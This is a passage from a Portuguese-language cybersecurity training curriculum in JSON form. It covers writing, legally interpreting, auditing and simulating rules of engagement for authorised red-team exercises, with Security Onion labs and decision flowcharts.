                                {
                                  "stepNumber": 1,
                                  "title": "Analisar o Cenário e Objetivos da Missão",
                                  "subSteps": [
                                    "Reveja os objetivos gerais do jogo de guerra cibernético ou operação.",
                                    "Identifique stakeholders envolvidos, incluindo equipes de defesa e supervisores.",
                                    "Mapeie o ambiente cibernético, incluindo redes, sistemas e ativos simulados.",
                                    "Consulte diretrizes do livro 'Red Team Development and Operations' para princípios iniciais.",
                                    "Documente riscos potenciais e limites éticos iniciais."
                                  ],
                                  "verification": "Relatório de análise do cenário aprovado por um supervisor, com mapa de ambiente anexado.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Livro 'Red Team Development and Operations'",
                                    "Templates de análise de cenário",
                                    "Ferramentas de mapeamento como Draw.io ou Lucidchart"
                                  ],
                                  "tips": "Priorize alinhamento com objetivos estratégicos para evitar desvios desnecessários.",
                                  "learningObjective": "Compreender o contexto completo do cenário para fundamentar ROE sólidas.",
                                  "commonMistakes": [
                                    "Ignorar perspectivas dos stakeholders de defesa",
                                    "Subestimar complexidade do ambiente cibernético",
                                    "Pular consulta a diretrizes padrão"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Alvos Permitidos e Restrições Geográficas/Técnicas",
                                  "subSteps": [
                                    "Liste alvos explícitos permitidos (ex.: IPs, domínios, serviços específicos).",
                                    "Especifique alvos proibidos e razões (ex.: sistemas de produção reais).",
                                    "Defina restrições geográficas, como apenas redes internas simuladas.",
                                    "Inclua limites de impacto, como sem downtime prolongado.",
                                    "Valide com regras legais e regulatórias aplicáveis."
                                  ],
                                  "verification": "Lista de alvos categorizada (permitidos/proibidos) assinada por stakeholders.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Planilha de alvos (Google Sheets ou Excel)",
                                    "Diretrizes legais de cibersegurança",
                                    "Diagrama de rede do cenário"
                                  ],
                                  "tips": "Use linguagem precisa como 'apenas VMs identificadas por tag X' para evitar ambiguidades.",
                                  "learningObjective": "Estabelecer limites claros de escopo para prevenir violações acidentais.",
                                  "commonMistakes": [
                                    "Definir alvos vagos como 'rede corporativa'",
                                    "Esquecer restrições de dados sensíveis",
                                    "Não considerar escalabilidade do cenário"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Especificar Métodos de Ataque Éticos e Técnicas Permitidas",
                                  "subSteps": [
                                    "Liste técnicas autorizadas (ex.: scanning Nmap, exploitation Metasploit em alvos permitidos).",
                                    "Defina métodos proibidos (ex.: DDoS, ransomware simulado).",
                                    "Inclua requisitos de autenticação e logging para todas ações.",
                                    "Alinhe com princípios éticos do livro 'Red Team Development and Operations'.",
                                    "Especifique ferramentas aprovadas e configurações seguras."
                                  ],
                                  "verification": "Matriz de métodos (permitidos/proibidos) com justificativas documentadas.",
                                  "estimatedTime": "1-1.5 horas",
                                  "materials": [
                                    "Livro 'Red Team Development and Operations'",
                                    "Lista de ferramentas Red Team aprovadas",
                                    "Templates de matriz de técnicas"
                                  ],
                                  "tips": "Sempre priorize 'no harm' – teste em ambientes isolados primeiro.",
                                  "learningObjective": "Garantir que ações sejam éticas e rastreáveis, minimizando riscos.",
                                  "commonMistakes": [
                                    "Permitir técnicas de alto risco sem salvaguardas",
                                    "Omitir logging obrigatório",
                                    "Confundir simulação com ataques reais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estabelecer Critérios de Escalada, Desengajamento e Comunicação",
                                  "subSteps": [
                                    "Defina gatilhos para escalada (ex.: sucesso em milestone X).",
                                    "Especifique condições de desengajamento (ex.: detecção pela defesa).",
                                    "Crie protocolos de comunicação (ex.: canais Slack dedicados, aprovações prévias).",
                                    "Inclua regras de 'abort mission' para emergências.",
                                    "Teste cenários hipotéticos de escalada."
                                  ],
                                  "verification": "Fluxograma de escalada/desengajamento revisado e aprovado.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas de fluxograma (ex.: Microsoft Visio)",
                                    "Protocolos de comunicação da equipe",
                                    "Cenários de teste hipotéticos"
                                  ],
                                  "tips": "Garanta aprovações em tempo real para escaladas críticas.",
                                  "learningObjective": "Criar mecanismos dinâmicos de controle para operações seguras.",
                                  "commonMistakes": [
                                    "Critérios de escalada muito vagos",
                                    "Falta de plano de contingência para falhas de comunicação",
                                    "Ignorar fadiga da equipe em operações longas"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar, Revisar e Validar as ROE",
                                  "subSteps": [
                                    "Compile todas seções em um documento ROE unificado.",
                                    "Realize revisão por pares e stakeholders.",
                                    "Simule walkthrough das ROE em um dry-run.",
                                    "Incorpore feedback e finalize versão assinada.",
                                    "Distribua ROE para toda equipe com confirmação de leitura."
                                  ],
                                  "verification": "Documento ROE final versionado, com assinaturas e atas de revisão.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Template padrão de ROE",
                                    "Ferramentas de versionamento (Google Docs)",
                                    "Checklist de validação"
                                  ],
                                  "tips": "Use numeração e negrito para seções críticas nas ROE.",
                                  "learningObjective": "Produzir ROE robustas, testadas e prontas para uso.",
                                  "commonMistakes": [
                                    "Pular revisão por pares",
                                    "Documento muito longo ou confuso",
                                    "Não confirmar compreensão da equipe"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team simulando um ataque APT a uma rede bancária virtual, as ROE definem: alvos permitidos = apenas 5 VMs tagged 'target'; métodos = Nmap scanning, Metasploit exploits sem persistência; escalada requer aprovação via canal #roe-approval após foothold inicial; desengajamento se Blue Team detectar em <5min.",
                              "finalVerifications": [
                                "ROE cobre todos alvos, métodos e critérios de escalada explicitamente.",
                                "Documento é claro, conciso e sem ambiguidades.",
                                "Simulação dry-run confirma aplicabilidade sem violações.",
                                "Todas partes assinam concordância.",
                                "Alinhamento verificado com diretrizes do livro 'Red Team Development and Operations'.",
                                "Protocolos de comunicação e logging incluídos."
                              ],
                              "assessmentCriteria": [
                                "Clareza e precisão da linguagem (sem jargões desnecessários).",
                                "Completude: todos elementos obrigatórios presentes.",
                                "Alinhamento ético e legal (zero riscos de violação).",
                                "Flexibilidade para cenários dinâmicos via critérios de escalada.",
                                "Facilidade de uso: estrutura lógica e visual.",
                                "Validação prática via simulação bem-sucedida."
                              ],
                              "crossCurricularConnections": [
                                "Ética em Segurança da Informação (análise de dilemas morais).",
                                "Direito Cibernético (conformidade com leis como LGPD/GDPR).",
                                "Gestão de Projetos (definição de escopo e riscos).",
                                "Estratégia Militar (adaptação de ROE tradicionais para ciber).",
                                "Comunicação Técnica (redação de documentos operacionais)."
                              ],
                              "realWorldApplication": "Em operações de Red Teaming corporativas ou governamentais, como testes de penetração autorizados pela CERT.br ou empresas Fortune 500, ROE previnem danos reais, garantem legalidade e facilitam lições aprendidas pós-exercício, alinhando com frameworks como MITRE ATT&CK."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.2.2",
                            "name": "Interpretar restrições legais em ROE",
                            "description": "Analisar impactos de leis como LGPD e GDPR em operações Red Team, identificando ações proibidas em ambientes simulados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de ROE e Contexto Legal",
                                  "subSteps": [
                                    "Definir ROE (Rules of Engagement) no contexto de jogos de guerra cibernética.",
                                    "Identificar o papel das restrições legais em operações Red Team simuladas.",
                                    "Listar legislações chave: LGPD (Brasil) e GDPR (Europa).",
                                    "Explicar diferenças entre ambientes reais e simulados.",
                                    "Mapear hierarquia: ROE > Leis Nacionais/Internacionais."
                                  ],
                                  "verification": "Criar um diagrama de fluxo mostrando integração de ROE com leis.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação oficial de ROE em cibersegurança",
                                    "Textos introdutórios sobre LGPD e GDPR",
                                    "Ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Comece com definições simples para construir base sólida; use analogias militares para ROE.",
                                  "learningObjective": "Entender a estrutura e importância das ROE legais em simulações cibernéticas.",
                                  "commonMistakes": [
                                    "Confundir ROE com regras técnicas",
                                    "Ignorar diferenças entre simulação e produção",
                                    "Subestimar escopo internacional do GDPR"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Restrições da LGPD em Operações Red Team",
                                  "subSteps": [
                                    "Estudar princípios da LGPD: consentimento, finalidade, adequação e transparência.",
                                    "Identificar dados pessoais sensíveis proibidos em testes (ex: CPF, biometria).",
                                    "Mapear violações comuns: coleta não autorizada, compartilhamento indevido.",
                                    "Avaliar impactos em técnicas Red Team como phishing e engenharia social.",
                                    "Documentar exceções para ambientes controlados e autorizados."
                                  ],
                                  "verification": "Listar 5 ações Red Team proibidas pela LGPD com justificativas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Lei Geral de Proteção de Dados (LGPD) texto integral",
                                    "Casos de estudo ANPD",
                                    "Templates de mapeamento de riscos"
                                  ],
                                  "tips": "Foquem em artigos 5-10 da LGPD; use tabelas para categorizar restrições.",
                                  "learningObjective": "Identificar e justificar restrições específicas da LGPD para simulações.",
                                  "commonMistakes": [
                                    "Generalizar todas as coletas como permitidas",
                                    "Ignorar direitos dos titulares de dados",
                                    "Não considerar multas administrativas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Restrições do GDPR e Comparações",
                                  "subSteps": [
                                    "Revisar princípios GDPR: lawful basis, data minimization, accountability.",
                                    "Comparar com LGPD: extrarritorialidade do GDPR vs. foco nacional da LGPD.",
                                    "Identificar proibições em Red Team: profiling automatizado, transferências internacionais.",
                                    "Analisar notificações de breach e DPIA (Data Protection Impact Assessment).",
                                    "Estudar sanções: multas até 4% do faturamento global."
                                  ],
                                  "verification": "Criar tabela comparativa LGPD vs. GDPR com 10 itens chave.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Regulamento GDPR (UE 2016/679)",
                                    "Guia EDPB",
                                    "Ferramentas de comparação como Excel"
                                  ],
                                  "tips": "Priorize Artigo 9 (dados sensíveis); pense em cenários cross-border.",
                                  "learningObjective": "Comparar impactos de GDPR e LGPD em operações internacionais simuladas.",
                                  "commonMistakes": [
                                    "Assumir GDPR só aplica à UE",
                                    "Subestimar requisitos de consentimento explícito",
                                    "Confundir com outras leis como CCPA"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e Aplicar Restrições em Cenários Simulados",
                                  "subSteps": [
                                    "Desenhar cenário Red Team: simulação de ataque em rede corporativa.",
                                    "Aplicar ROE: cruzar ações planejadas com LGPD/GDPR.",
                                    "Identificar ações proibidas e alternativas legais (ex: dados fictícios).",
                                    "Redigir relatório de conformidade ROE.",
                                    "Simular revisão por equipe legal."
                                  ],
                                  "verification": "Analisar cenário fornecido e listar ações permitidas/proibidas com razões.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Cenários simulados Red Team",
                                    "Templates de relatório ROE",
                                    "Ferramentas de simulação como Cyber Range"
                                  ],
                                  "tips": "Use dados anonimizados sempre; valide com checklist legal.",
                                  "learningObjective": "Interpretar restrições legais em ROE para cenários práticos de Red Team.",
                                  "commonMistakes": [
                                    "Permitir ações 'quase legais'",
                                    "Não documentar exceções simuladas",
                                    "Ignorar contexto de autorização prévia"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação Red Team de phishing contra uma empresa brasileira com operações na UE: planejar envio de e-mails falsos coletando e-mails e CPFs. Identificar proibição pela LGPD (Art. 7 - consentimento) e GDPR (Art. 6 - base legal), optando por dados fictícios anonimizados e obtendo autorização explícita simulada.",
                              "finalVerifications": [
                                "Listar corretamente 8 restrições chave de LGPD/GDPR em Red Team.",
                                "Analisar um cenário e identificar todas ações proibidas.",
                                "Criar diagrama ROE integrado com leis.",
                                "Explicar diferenças LGPD vs. GDPR em 3 pontos.",
                                "Redigir relatório de conformidade sem erros legais.",
                                "Identificar exceções para simulações autorizadas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de violações legais (90%+ acerto).",
                                "Profundidade na análise de impactos em técnicas Red Team.",
                                "Clareza na documentação de ROE e alternativas legais.",
                                "Uso correto de terminologia legal (LGPD/GDPR).",
                                "Criatividade em soluções conformes para cenários simulados.",
                                "Completude do mapeamento comparativo entre leis."
                              ],
                              "crossCurricularConnections": [
                                "Direito Digital e Compliance",
                                "Ética em Segurança da Informação",
                                "Gestão de Riscos e Governança de TI",
                                "Direito Internacional e Extraterritorialidade",
                                "Análise de Cenários em Jogos de Guerra"
                              ],
                              "realWorldApplication": "Em pentests autorizados (ex: empresas com operações BR/EU), equipes Red Team usam essa interpretação para evitar multas milionárias, garantindo que simulações respeitem LGPD/GDPR, com relatórios ROE aprovados por DPOs (Data Protection Officers)."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.2.3",
                            "name": "Auditar conformidade com ROE",
                            "description": "Verificar se ações de pivoting e persistência cumprem ROE durante exercícios, usando checklists e relatórios pós-operação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar materiais de auditoria e revisar ROE",
                                  "subSteps": [
                                    "Ler e anotar todas as Regras de Engajamento (ROE) relevantes para pivoting e persistência.",
                                    "Criar ou adaptar checklists personalizadas baseadas nas ROE, incluindo critérios para ações permitidas e proibidas.",
                                    "Identificar ferramentas de monitoramento como logs de rede, SIEM e ferramentas de captura de tráfego.",
                                    "Coordenar com a equipe de operações para definir pontos de observação durante o exercício.",
                                    "Realizar um teste seco da checklist em um ambiente simulado."
                                  ],
                                  "verification": "Checklist preenchida com 100% das seções ROE cobertas e aprovada por um supervisor.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Documentos ROE oficiais",
                                    "Modelos de checklists (Excel ou Google Sheets)",
                                    "Ferramentas de documentação como Notion ou Markdown"
                                  ],
                                  "tips": "Priorize ROE críticas para pivoting (ex: escopo de rede) e persistência (ex: duração máxima).",
                                  "learningObjective": "Compreender e operacionalizar ROE em formatos acionáveis para auditoria.",
                                  "commonMistakes": [
                                    "Ignorar ROE contextuais específicas do exercício",
                                    "Criar checklists genéricas sem adaptação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Monitorar ações em tempo real durante o exercício",
                                  "subSteps": [
                                    "Posicionar-se em pontos de observação para capturar ações de pivoting (ex: lateral movement via RDP ou SSH).",
                                    "Registrar timestamps, IPs, métodos usados e justificativas alegadas pela equipe de ataque.",
                                    "Comparar cada ação com a checklist ROE em tempo real, marcando conformidade ou potenciais violações.",
                                    "Alertar discretamente a equipe se uma violação iminente for detectada, sem interromper o fluxo.",
                                    "Manter um log contínuo com evidências como screenshots de ferramentas (Wireshark, Zeek)."
                                  ],
                                  "verification": "Log de monitoramento completo com entradas para todas as ações observadas de pivoting/persistência.",
                                  "estimatedTime": "Duração do exercício (4-8 horas)",
                                  "materials": [
                                    "Ferramentas de monitoramento (Wireshark, tcpdump, SIEM)",
                                    "Checklist impressa ou digital",
                                    "Notebook para logs manuais"
                                  ],
                                  "tips": "Use timestamps precisos e capture pacotes de rede para evidências irrefutáveis.",
                                  "learningObjective": "Desenvolver habilidades de observação em tempo real alinhadas a ROE.",
                                  "commonMistakes": [
                                    "Focar apenas em violações óbvias, ignorando conformidades",
                                    "Interferir no exercício ao confrontar a equipe"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar evidências e identificar não-conformidades",
                                  "subSteps": [
                                    "Revisar logs e checklists para mapear ações contra ROE específicas.",
                                    "Classificar violações por severidade (menor, moderada, crítica) com justificativas baseadas em evidências.",
                                    "Entrevistar membros da equipe de ataque para contextos não observados.",
                                    "Compilar métricas quantitativas: % de conformidade, número de ações auditadas.",
                                    "Documentar recomendações para treinamento futuro."
                                  ],
                                  "verification": "Relatório preliminar com análise completa de pelo menos 90% das ações auditadas.",
                                  "estimatedTime": "2-4 horas pós-exercício",
                                  "materials": [
                                    "Logs coletados",
                                    "Checklist atualizada",
                                    "Ferramentas de análise (ELK Stack ou Excel)"
                                  ],
                                  "tips": "Use matrizes de decisão para classificar violações rapidamente.",
                                  "learningObjective": "Analisar dados de auditoria para insights acionáveis sobre conformidade ROE.",
                                  "commonMistakes": [
                                    "Basear análise apenas em opiniões subjetivas sem evidências",
                                    "Subestimar violações menores que acumulam"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerar relatório pós-operação e apresentar achados",
                                  "subSteps": [
                                    "Estruturar relatório: introdução, metodologia, achados, recomendações e anexos com evidências.",
                                    "Incluir visualizações como gráficos de conformidade e timeline de ações.",
                                    "Revisar relatório com pares para precisão e clareza.",
                                    "Apresentar a stakeholders, destacando lições aprendidas e impactos em ROE futuras.",
                                    "Arquivar relatório em repositório seguro para auditorias subsequentes."
                                  ],
                                  "verification": "Relatório final aprovado e apresentado, com feedback positivo de stakeholders.",
                                  "estimatedTime": "3-5 horas",
                                  "materials": [
                                    "Templates de relatório",
                                    "Ferramentas de apresentação (PowerPoint, Google Slides)",
                                    "Evidências digitais"
                                  ],
                                  "tips": "Mantenha linguagem objetiva e foque em fatos + impactos.",
                                  "learningObjective": "Comunicar resultados de auditoria de forma profissional e impactante.",
                                  "commonMistakes": [
                                    "Relatórios prolixos sem resumo executivo",
                                    "Omitir recomendações práticas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team simulando ataque a uma rede corporativa, a equipe pivota de um servidor web (IP 192.168.1.10) para um banco de dados (IP 192.168.1.20) via SMB. O auditor verifica: ROE permite pivoting apenas em rede 192.168.1.0/24 e proíbe persistência >24h. Registra conformidade no pivoting mas flagra violação na instalação de backdoor por 48h, usando Wireshark para evidência de tráfego C2.",
                              "finalVerifications": [
                                "Checklist ROE 100% utilizada e preenchida.",
                                "Todas ações de pivoting/persistência registradas com evidências.",
                                "% de conformidade calculada e reportada.",
                                "Relatório pós-operação entregue no prazo.",
                                "Recomendações implementáveis incluídas.",
                                "Feedback de stakeholders recebido e arquivado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de conformidades/violações (90%+ acurácia).",
                                "Completude da documentação e evidências (sem lacunas).",
                                "Qualidade do relatório (claro, conciso, visual).",
                                "Efetividade das recomendações (acionáveis e baseadas em dados).",
                                "Adesão a prazos e procedimentos.",
                                "Demonstração de conhecimento profundo de ROE."
                              ],
                              "crossCurricularConnections": [
                                "Ética e Direito: Aplicação de regras legais em operações cibernéticas.",
                                "Gerenciamento de Projetos: Monitoramento e relatórios de conformidade.",
                                "Análise de Dados: Processamento de logs e métricas.",
                                "Comunicações: Apresentação de achados técnicos a não-especialistas."
                              ],
                              "realWorldApplication": "Em operações cibernéticas militares ou corporativas, auditores ROE previnem escaladas não autorizadas, como em ciberdefesas nacionais (ex: auditoria em exercícios da NSA ou CERTs governamentais), garantindo legalidade e minimizando riscos geopolíticos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.5.3",
                        "name": "Integração de SA e ROE para Decisões Operacionais",
                        "description": "Processos para fusionar dados de consciência situacional com regras de engajamento, permitindo decisões rápidas e conformes em operações de ataque cibernético.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.5.3.1",
                            "name": "Desenvolver fluxogramas de decisão SA-ROE",
                            "description": "Construir diagramas que combinem SA em tempo real com verificações de ROE para aprovar ou vetar ações como ethical hacking e C2 (Comando e Controle).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de SA e ROE",
                                  "subSteps": [
                                    "Definir Situational Awareness (SA) como a percepção em tempo real de elementos no ambiente cibernético.",
                                    "Definir Rules of Engagement (ROE) como diretrizes legais e éticas para ações em operações cibernéticas.",
                                    "Identificar exemplos de SA em ethical hacking, como monitoramento de tráfego de rede.",
                                    "Listar componentes de ROE relevantes para C2, como critérios de aprovação para contra-ataques.",
                                    "Analisar como SA alimenta ROE em decisões operacionais."
                                  ],
                                  "verification": "Explicar verbalmente ou por escrito a diferença entre SA e ROE com exemplos cibernéticos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentos de referência sobre SA e ROE (NIST SP 800-61, manuais militares)",
                                    "Vídeos tutoriais sobre consciência situacional cibernética"
                                  ],
                                  "tips": "Use analogias militares tradicionais para contextualizar SA e ROE no ciberespaço.",
                                  "learningObjective": "Dominar definições e interdependências entre SA e ROE no contexto de operações cibernéticas.",
                                  "commonMistakes": [
                                    "Confundir SA com coleta de inteligência estratégica",
                                    "Ignorar aspectos éticos nas ROE",
                                    "Subestimar a necessidade de SA em tempo real"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Elementos de Entrada, Processamento e Saída",
                                  "subSteps": [
                                    "Listar inputs de SA: alertas de intrusão, métricas de tráfego, status de sistemas.",
                                    "Definir verificações de ROE: conformidade legal, nível de ameaça, autorização prévia.",
                                    "Especificar saídas: Aprovar ação (ex: ethical hack), Vetar, Escalar para C2.",
                                    "Criar tabela de mapeamento de inputs para possíveis saídas.",
                                    "Identificar variáveis condicionais como 'ameaça crítica?' ou 'ROE permite contra-ataque?'."
                                  ],
                                  "verification": "Apresentar tabela de mapeamento completa e lógica para revisão.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Planilha Excel ou Google Sheets para mapeamento",
                                    "Templates de fluxogramas vazios"
                                  ],
                                  "tips": "Priorize inputs de SA de alta criticidade para fluxos de decisão rápidos.",
                                  "learningObjective": "Identificar e organizar todos os elementos necessários para o fluxograma SA-ROE.",
                                  "commonMistakes": [
                                    "Omitir saídas de escalonamento",
                                    "Incluir inputs irrelevantes",
                                    "Não considerar loops de feedback"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir a Estrutura Básica do Fluxograma",
                                  "subSteps": [
                                    "Iniciar com símbolo de início (oval) e adicionar inputs de SA.",
                                    "Inserir caixa de decisão para primeira verificação ROE.",
                                    "Adicionar ramificações: 'Sim' para aprovar, 'Não' para vetar.",
                                    "Conectar a saídas finais (aprovar C2, notificar, etc.).",
                                    "Garantir setas claras e legendas para símbolos."
                                  ],
                                  "verification": "Gerar fluxograma draft e walkthrough passo a passo.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de fluxograma: Lucidchart, Draw.io ou Microsoft Visio",
                                    "Guia de símbolos padrão BPMN ou flowchart"
                                  ],
                                  "tips": "Mantenha o fluxograma simples inicialmente; refine depois.",
                                  "learningObjective": "Criar estrutura visual básica que represente fluxo SA para ROE.",
                                  "commonMistakes": [
                                    "Usar símbolos incorretos",
                                    "Ramificações ambíguas",
                                    "Fluxo não sequencial"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Lógica Avançada e Refinar",
                                  "subSteps": [
                                    "Adicionar loops de feedback: se SA muda, reverificar ROE.",
                                    "Incluir condições compostas: AND/OR para múltiplas verificações ROE.",
                                    "Incorporar ethical hacking specifics: aprovar scans apenas se ROE autorizado.",
                                    "Adicionar timers para decisões em tempo real.",
                                    "Testar logicamente com cenários hipotéticos."
                                  ],
                                  "verification": "Simular 3 cenários diferentes no fluxograma e registrar saídas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Mesmas ferramentas de fluxograma",
                                    "Casos de estudo de operações cibernéticas"
                                  ],
                                  "tips": "Use cores para diferenciar SA (azul), ROE (verde) e decisões (vermelho).",
                                  "learningObjective": "Implementar lógica complexa para decisões operacionais precisas.",
                                  "commonMistakes": [
                                    "Loops infinitos",
                                    "Condições lógicas mal definidas",
                                    "Ignorar cenários edge-case"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar, Documentar e Otimizar",
                                  "subSteps": [
                                    "Revisar fluxograma com pares ou mentor para feedback.",
                                    "Documentar assunções, legendas e exemplos de uso.",
                                    "Otimizar para clareza: remover redundâncias, melhorar layout.",
                                    "Simular em ferramenta interativa se possível.",
                                    "Preparar para implementação em C2 systems."
                                  ],
                                  "verification": "Produzir versão final documentada e auto-avaliar contra critérios.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Checklist de validação",
                                    "Ferramentas de revisão colaborativa como Google Docs"
                                  ],
                                  "tips": "Sempre inclua 'data/hora da última revisão' para rastreabilidade.",
                                  "learningObjective": "Garantir fluxograma robusto, documentado e pronto para uso operacional.",
                                  "commonMistakes": [
                                    "Falta de documentação",
                                    "Não testar edge-cases",
                                    "Layout confuso"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética, SA detecta 'tentativa de phishing em rede corporativa'. Fluxograma verifica ROE: 1) Ameaça autorizada? Sim. 2) Ethical hack permitido? Sim. Saída: Aprovar C2 para contra-phishing automatizado.",
                              "finalVerifications": [
                                "Construir fluxograma completo de SA-ROE para cenário dado em <10 min.",
                                "Explicar lógica de qualquer ramificação escolhida aleatoriamente.",
                                "Identificar e corrigir falha introduzida em fluxograma existente.",
                                "Adaptar fluxograma para novo contexto cibernético.",
                                "Documentar fluxograma com legendas claras e assunções."
                              ],
                              "assessmentCriteria": [
                                "Precisão na integração de inputs SA com verificações ROE (30%)",
                                "Clareza e padronização visual do fluxograma (25%)",
                                "Cobertura de cenários lógicos, incluindo edge-cases (20%)",
                                "Documentação completa e acionável (15%)",
                                "Eficiência e otimização do fluxo (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Lógica de Programação: Estruturas condicionais if-then-else.",
                                "Ética e Direito: Aplicação de regras normativas em decisões.",
                                "Gestão de Projetos: Mapeamento de processos BPMN.",
                                "Análise de Riscos: Avaliação de ameaças cibernéticas.",
                                "Inteligência Artificial: Integração com sistemas de SA automatizados."
                              ],
                              "realWorldApplication": "Em centros de operações cibernéticas (como USCYBERCOM), fluxogramas SA-ROE guiam decisões em tempo real durante incidentes, aprovando ethical hacking ou C2 contra adversários estatais, minimizando riscos legais e escaladas desnecessárias."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.3.2",
                            "name": "Simular cenários integrados",
                            "description": "Executar jogos de guerra cibernéticos montando ambientes com Security Onion, testando integração SA-ROE em ataques simulados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de simulação com Security Onion",
                                  "subSteps": [
                                    "Baixar e instalar o Security Onion em uma VM ou máquina dedicada seguindo a documentação oficial.",
                                    "Configurar sensores e gerenciadores (SO-Sensor e SO-Manager) para monitoramento de rede.",
                                    "Integrar ferramentas como Suricata, Zeek e ELK Stack para coleta de dados de SA.",
                                    "Testar conectividade básica e acesso ao dashboard web do Security Onion.",
                                    "Definir regras iniciais de rede para isolar o ambiente de simulação."
                                  ],
                                  "verification": "Acessar o dashboard do Security Onion e confirmar que todos os serviços estão rodando sem erros (ver logs em /var/log).",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Máquina com 16GB RAM, 4 CPUs, 200GB disco",
                                    "ISO do Security Onion",
                                    "VMware/VirtualBox",
                                    "Documentação oficial Security Onion"
                                  ],
                                  "tips": "Use snapshots de VM para facilitar resets entre simulações; priorize rede bridge para tráfego realista.",
                                  "learningObjective": "Dominar a instalação e configuração inicial do Security Onion para ambientes de jogos de guerra cibernéticos.",
                                  "commonMistakes": [
                                    "Ignorar requisitos de hardware levando a falhas de performance",
                                    "Não configurar firewall corretamente expondo o host",
                                    "Pular testes de conectividade inicial"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir cenários de ataque e integrar SA e ROE",
                                  "subSteps": [
                                    "Mapear um cenário realista, ex: ataque DDoS a infraestrutura crítica.",
                                    "Documentar elementos de Consciência Situacional (SA): indicadores de comprometimento (IoCs), tráfego anômalo.",
                                    "Definir Regras de Engajamento (ROE): thresholds para detecção, ações permitidas (bloqueio, contra-ataque simulado).",
                                    "Configurar alertas no Security Onion baseados em SA-ROE (usar Playbooks no Squert ou Kibana).",
                                    "Criar scripts para automação de ROE (ex: Python com Scapy para simular respostas)."
                                  ],
                                  "verification": "Gerar relatório de configuração mostrando mapeamento SA-ROE e testar alerta manual com tráfego simulado.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Editor de texto/IDE (VS Code)",
                                    "Templates de cenários cibernéticos (MITRE ATT&CK)",
                                    "Ferramentas: Scapy, Wireshark"
                                  ],
                                  "tips": "Alinhe ROE com leis como ROE cibernéticas da OTAN; use YAML para definir playbooks legíveis.",
                                  "learningObjective": "Capacitar a criação de cenários integrados que incorporem SA e ROE de forma operacional.",
                                  "commonMistakes": [
                                    "ROE muito rígidas sem flexibilidade",
                                    "Falta de IoCs realistas no SA",
                                    "Não documentar thresholds levando a falsos positivos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar simulações de ataques integrados",
                                  "subSteps": [
                                    "Lançar ataque simulado (ex: hping3 para DDoS, Metasploit para exploit).",
                                    "Monitorar em tempo real via Security Onion: detectar via SA e acionar ROE.",
                                    "Registrar decisões operacionais baseadas na integração (logs de ações tomadas).",
                                    "Simular iterações múltiplas variando intensidade do ataque.",
                                    "Pausar e ajustar ROE com base em feedback SA durante a execução."
                                  ],
                                  "verification": "Logs do Security Onion mostram detecção SA, aplicação ROE e resolução do cenário (ex: tráfego bloqueado).",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "Ferramentas de ataque: hping3, Metasploit, Atomic Red Team",
